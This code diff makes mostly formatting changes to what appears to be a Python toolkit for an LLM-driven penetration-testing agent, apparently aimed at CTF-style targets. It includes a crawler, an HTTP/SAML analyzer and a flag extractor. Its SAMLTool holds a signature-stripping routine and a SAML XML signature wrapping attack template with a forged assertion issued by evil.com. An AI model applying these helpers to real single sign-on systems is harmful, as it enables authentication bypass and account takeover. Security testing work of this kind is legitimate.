@@ -5,10 +5,11 @@
 
 from __future__ import annotations
 
+import contextlib
 import json
 import re
 import urllib.parse
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 
 import structlog
 
@@ -40,6 +41,7 @@ class HTTPClient:
 
     async def get(self, url: str, headers: dict | None = None) -> HTTPResponse:
         import asyncio
+
         cmd = ["curl", "-s", "-i", "-L", "--max-time", "10"]
         for k, v in (headers or {}).items():
             cmd.extend(["-H", f"{k}: {v}"])
@@ -55,6 +57,7 @@ class HTTPClient:
 
     async def post(self, url: str, data: str, headers: dict | None = None) -> HTTPResponse:
         import asyncio
+
         cmd = ["curl", "-s", "-i", "-L", "--max-time", "10", "-X", "POST"]
         for k, v in (headers or {}).items():
             cmd.extend(["-H", f"{k}: {v}"])
@@ -82,10 +85,8 @@ class HTTPClient:
             if line.startswith("HTTP/"):
                 parts = line.split()
                 if len(parts) >= 2:
-                    try:
+                    with contextlib.suppress(ValueError):
                         status = int(parts[1])
-                    except ValueError:
-                        pass
             elif ":" in line and body_start == 0:
                 k, v = line.split(":", 1)
                 headers[k.strip()] = v.strip()
@@ -106,6 +107,7 @@ class CrawlerTool(Tool):
     async def run(self, args: str) -> str:
         """args: <url> [--depth 2]"""
         import asyncio
+
         parts = args.split()
         if not parts:
             return "Error: 用法: crawler <url> [--depth N]"
@@ -120,6 +122,7 @@ class CrawlerTool(Tool):
         # 逐工具超时
         try:
             from secpt.config.settings import get_settings
+
             _settings = get_settings()
             _timeout = _settings.tools.tool_timeouts.get("crawler", 30.0)
         except Exception:
@@ -127,8 +130,15 @@ class CrawlerTool(Tool):
 
         try:
             return await asyncio.wait_for(self._crawl(url, depth), timeout=_timeout)
-        except asyncio.TimeoutError:
-            return json.dumps({"status": "failure", "error_type": "timeout", "hint": "crawler 超时，请减小 depth 或换目标"}, ensure_ascii=False)
+        except TimeoutError:
+            return json.dumps(
+                {
+                    "status": "failure",
+                    "error_type": "timeout",
+                    "hint": "crawler 超时，请减小 depth 或换目标",
+                },
+                ensure_ascii=False,
+            )
         except Exception as e:
             return f"Error: {e}"
 
@@ -165,7 +175,9 @@ class CrawlerTool(Tool):
                         to_visit.append((link, d + 1))
 
             # 提取表单
-            for m in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\'](\w+)["\']', resp.body, re.I):
+            for m in re.finditer(
+                r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\'](\w+)["\']', resp.body, re.I
+            ):
                 action = urllib.parse.urljoin(current, m.group(1))
                 found["forms"].add(f"{m.group(2).upper()} {action}")
 
@@ -183,19 +195,23 @@ class CrawlerTool(Tool):
                 except Exception:
                     pass
 
-        return json.dumps({
-            "visited": len(visited),
-            "links": sorted(found["links"])[:20],
-            "forms": sorted(found["forms"])[:10],
-            "endpoints": sorted(found["endpoints"]),
-            "scripts": sorted(found["scripts"])[:10],
-        }, indent=2, ensure_ascii=False)
+        return json.dumps(
+            {
+                "visited": len(visited),
+                "links": sorted(found["links"])[:20],
+                "forms": sorted(found["forms"])[:10],
+                "endpoints": sorted(found["endpoints"]),
+                "scripts": sorted(found["scripts"])[:10],
+            },
+            indent=2,
+            ensure_ascii=False,
+        )
 
     def _same_domain(self, base: str, link: str) -> bool:
         try:
             b = urllib.parse.urlparse(base)
-            l = urllib.parse.urlparse(link)
-            return b.netloc == l.netloc or l.netloc == ""
+            linked = urllib.parse.urlparse(link)
+            return b.netloc == linked.netloc or linked.netloc == ""
         except Exception:
             return False
 
@@ -238,9 +254,15 @@ class HTTPAnalyzerTool(Tool):
 
         # SAML 指标
         saml_keywords = [
-            "samlrequest", "samlresponse", "saml2p", "samlp",
-            "entityid", "assertionconsumerservice", "single_sign_on",
-            "identityprovider", "serviceprovider",
+            "samlrequest",
+            "samlresponse",
+            "saml2p",
+            "samlp",
+            "entityid",
+            "assertionconsumerservice",
+            "single_sign_on",
+            "identityprovider",
+            "serviceprovider",
         ]
         for kw in saml_keywords:
             if kw in body_lower or kw in str(resp.headers).lower():
@@ -250,7 +272,9 @@ class HTTPAnalyzerTool(Tool):
         if "location" in resp.headers and "saml" in resp.headers.get("location", "").lower():
             findings["auth_mechanisms"].append(f"Redirect to SAML: {resp.headers['location']}")
         if "www-authenticate" in resp.headers:
-            findings["auth_mechanisms"].append(f"WWW-Authenticate: {resp.headers['www-authenticate']}")
+            findings["auth_mechanisms"].append(
+                f"WWW-Authenticate: {resp.headers['www-authenticate']}"
+            )
         if "set-cookie" in resp.headers:
             findings["auth_mechanisms"].append(f"Cookie: {resp.headers['set-cookie'][:100]}")
 
@@ -283,7 +307,7 @@ class SAMLTool(Tool):
 
     async def run(self, args: str) -> str:
         """args: <subcommand> [options]
-        
+
         子命令:
           decode <b64>     — 解码 Base64 + URL 编码的 SAML 消息
           encode <xml>     — 编码 XML 为 SAML 传输格式
@@ -310,6 +334,7 @@ class SAMLTool(Tool):
     def _decode(self, data: str) -> str:
         """解码 SAML 消息。"""
         import base64
+
         try:
             # URL 解码 + Base64 解码
             decoded = urllib.parse.unquote(data)
@@ -321,6 +346,7 @@ class SAMLTool(Tool):
     def _encode(self, xml: str) -> str:
         """编码 XML 为 SAML 传输格式。"""
         import base64
+
         try:
             b64 = base64.b64encode(xml.encode()).decode()
             return urllib.parse.quote(b64)
@@ -331,25 +357,27 @@ class SAMLTool(Tool):
         """移除 XML 签名。"""
         # 移除 Signature 元素
         patterns = [
-            r'<ds:Signature[^>]*>.*?</ds:Signature>',
-            r'<Signature[^>]*>.*?</Signature>',
-            r'<ds:Signature[^>]*/>',
+            r"<ds:Signature[^>]*>.*?</ds:Signature>",
+            r"<Signature[^>]*>.*?</Signature>",
+            r"<ds:Signature[^>]*/>",
         ]
         result = xml
         for p in patterns:
-            result = re.sub(p, '', result, flags=re.DOTALL | re.I)
+            result = re.sub(p, "", result, flags=re.DOTALL | re.I)
         return result
 
     def _wrap(self, xml: str) -> str:
         """XML 包装攻击模板。"""
         # 提取 Assertion
-        assertion_match = re.search(r'<(?:saml:)?Assertion[^>]*>.*?</(?:saml:)?Assertion>', xml, re.DOTALL)
+        assertion_match = re.search(
+            r"<(?:saml:)?Assertion[^>]*>.*?</(?:saml:)?Assertion>", xml, re.DOTALL
+        )
         if not assertion_match:
             return "Error: 未找到 Assertion 元素"
 
         assertion = assertion_match.group(0)
         # 经典包装攻击
-        wrapped = f'''<?xml version="1.0" encoding="UTF-8"?>
+        wrapped = f"""<?xml version="1.0" encoding="UTF-8"?>
 <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
   <samlp:Status>
     <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
@@ -358,7 +386,7 @@ class SAMLTool(Tool):
     <Issuer>https://evil.com</Issuer>
   </Assertion>
   {assertion}
-</samlp:Response>'''
+</samlp:Response>"""
         return wrapped
 
 
@@ -385,11 +413,11 @@ class FlagExtractorTool(Tool):
 
         # 多种 FLAG 格式
         patterns = [
-            r'FLAG\{[^}]+\}',
-            r'flag\{[^}]+\}',
-            r'CTF\{[^}]+\}',
-            r'flag_[a-f0-9]{32}',
-            r'[Ff][Ll][Aa][Gg][:：]\s*([^\s,;]+)',
+            r"FLAG\{[^}]+\}",
+            r"flag\{[^}]+\}",
+            r"CTF\{[^}]+\}",
+            r"flag_[a-f0-9]{32}",
+            r"[Ff][Ll][Aa][Gg][:：]\s*([^\s,;]+)",
         ]
 
         found = []
@@ -398,21 +426,28 @@ class FlagExtractorTool(Tool):
                 found.append(m.group(0))
 
         if found:
-            return json.dumps({
-                "flags": found,
-                "count": len(found),
-            }, indent=2)
+            return json.dumps(
+                {
+                    "flags": found,
+                    "count": len(found),
+                },
+                indent=2,
+            )
         else:
             # 返回前 500 字符供 LLM 分析
-            return json.dumps({
-                "flags": [],
-                "hint": text[:500],
-            }, indent=2, ensure_ascii=False)
+            return json.dumps(
+                {
+                    "flags": [],
+                    "hint": text[:500],
+                },
+                indent=2,
+                ensure_ascii=False,
+            )
 
 
 __all__ = [
     "CrawlerTool",
+    "FlagExtractorTool",
     "HTTPAnalyzerTool",
     "SAMLTool",
-    "FlagExtractorTool",
 ]
